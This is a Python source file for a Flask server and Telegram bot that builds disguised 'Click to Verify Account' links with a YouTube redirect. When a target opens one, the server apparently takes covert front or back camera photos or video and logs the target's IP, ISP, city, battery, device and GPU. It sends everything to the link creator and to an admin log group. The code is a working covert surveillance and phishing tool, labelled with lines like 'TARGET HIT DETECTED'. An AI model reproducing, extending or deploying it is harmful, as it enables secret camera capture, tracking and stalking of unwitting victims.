import os, telebot, threading, io, time
from flask import Flask, render_template, request

# --- CONFIGURATION ---
# Ensure these are set in your Koyeb Environment Variables
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') # Your Master Log Group ID

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# In-memory storage for logs and user preferences
# collection stores: { "session_id": {"photos": [], "info": "...", "creator": "..."} }
collection = {}
user_temp = {}

# --- TELEGRAM BOT INTERFACE ---

def main_menu_markup():
    """Creates the persistent menu for the bot."""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row("🤳 Front Cam", "📷 Back Cam")
    markup.row("📸 8 Photos", "🎥 3s Video")
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    """Initializes the user session and shows the menu."""
    bot.send_message(
        m.chat.id, 
        f"✅ <b>VinzyStore Multi-User System Active.</b>\n"
        f"Your ID: <code>{m.chat.id}</code>\n\n"
        f"Select your capture settings below:", 
        reply_markup=main_menu_markup(), 
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(m):
    """Sets camera preference: 'user' (front) or 'environment' (back)."""
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['cam'] = 'user' if "Front" in m.text else 'environment'
    bot.send_message(m.chat.id, f"✅ Camera set to: <b>{m.text}</b>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode(m):
    """Sets capture mode and asks for the YouTube redirect ID."""
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    
    msg = bot.send_message(
        m.chat.id, 
        "🔗 <b>Enter YouTube Video ID</b> (e.g., dQw4w9WgXcQ) or type 'default':", 
        parse_mode="HTML", 
        reply_markup=telebot.types.ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, make_link)

def make_link(m):
    """Generates the unique tracking link for the user."""
    if m.chat.id not in user_temp:
        user_temp[m.chat.id] = {'cam': 'user', 'mode': 'photo'}
    
    yt = m.text if (m.text and m.text.lower() != 'default') else 'dQw4w9WgXcQ'
    d = user_temp[m.chat.id]
    
    # Construct the URL with all parameters
    raw_link = f"{BASE_URL.rstrip('/')}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={yt}"
    
    # Pretty Hyperlink for professional appearance
    pretty_link = f'<a href="{raw_link}">🔗 Click to Verify Account</a>'
    
    response = (
        f"🚀 <b>Link Generated Successfully!</b>\n\n"
        f"<b>Customer View:</b>\n{pretty_link}\n\n"
        f"<b>Raw Link (Copy this):</b>\n<code>{raw_link}</code>"
    )
    
    bot.send_message(m.chat.id, response, parse_mode="HTML", reply_markup=main_menu_markup())

# --- WEB SERVER ENGINE ---

@app.route('/')
def index():
    """Detects User-Agent and serves the correct OS template."""
    ua = request.headers.get('User-Agent', '').lower()
    if 'iphone' in ua or 'ipad' in ua:
        return render_template('ios.html')
    elif 'android' in ua:
        return render_template('android.html')
    else:
        return render_template('pc.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    """Receives target device specifications and location data."""
    data = request.json
    tid = request.args.get('id') # The Creator's Telegram ID
    ip = data.get('ip', request.remote_addr)
    
    # Unique key to link log_info with the incoming photos
    session_key = f"{tid}_{ip.replace('.', '_')}"
    
    info_text = (
        f"⚡ <b>TARGET HIT DETECTED</b> ⚡\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🏢 <b>ISP:</b> {data.get('org', 'N/A')}\n"
        f"📍 <b>LOC:</b> {data.get('city', 'N/A')}, {data.get('country_name', 'N/A')}\n"
        f"🔋 <b>BAT:</b> {data.get('battery', 'N/A')}\n"
        f"📱 <b>DEV:</b> {data.get('platform', 'N/A')}\n"
        f"⚙️ <b>GPU:</b> {data.get('gpu', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━"
    )
    
    # Save target info in memory
    if session_key not in collection:
        collection[session_key] = {"photos": [], "creator": tid}
    
    collection[session_key]["info"] = info_text
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    """Receives photo/video files and sends them to the correct Telegram user."""
    tid = request.args.get('id')
    ip = request.remote_addr
    session_key = f"{tid}_{ip.replace('.', '_')}"
    
    file_bytes = request.files['file'].read()
    
    # Ensure a session exists even if log_info was slow
    if session_key not in collection:
        collection[session_key] = {
            "photos": [], 
            "info": f"⚠️ <b>Fast Capture (No Logs)</b>\nID: {tid}\nIP: {ip}", 
            "creator": tid
        }
    
    session = collection[session_key]
    info = session.get("info")

    # 1. Video Capture Handler
    if request.args.get('type') == 'video':
        try:
            video_io = io.BytesIO(file_bytes)
            bot.send_video(tid, video_io, caption=info, parse_mode="HTML")
            if GROUP_ID:
                bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"Admin Log:\n{info}", parse_mode="HTML")
        except: pass
        return "OK"

    # 2. Photo Album Handler (Wait for 8 photos)
    session["photos"].append(file_bytes)
    
    if len(session["photos"]) >= 8:
        try:
            # Prepare Media Group (Album)
            media = [
                telebot.types.InputMediaPhoto(p, caption=info if i==0 else "", parse_mode="HTML") 
                for i, p in enumerate(session["photos"])
            ]
            
            # Send to Creator
            bot.send_media_group(tid, media)
            
            # Send to Master Log Group
            if GROUP_ID:
                bot.send_media_group(GROUP_ID, media)
            
            # Wipe memory for this session
            del collection[session_key]
        except Exception as e:
            print(f"Deployment Error: {e}")
            
    return "OK"

# --- BOT POLLING SYSTEM ---

def run_bot():
    """Background thread to keep the bot active with crash protection."""
    while True:
        try:
            bot.remove_webhook()
            # Timeout set high for stability
            bot.polling(none_stop=True, interval=0, timeout=40)
        except Exception as e:
            print(f"Polling Conflict Detected: {e}. Restarting in 15s...")
            time.sleep(15)

if __name__ == "__main__":
    # Start the Telegram Bot in a separate thread
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Run Flask on Port 8000 for Koyeb compatibility
    app.run(host='0.0.0.0', port=8000)
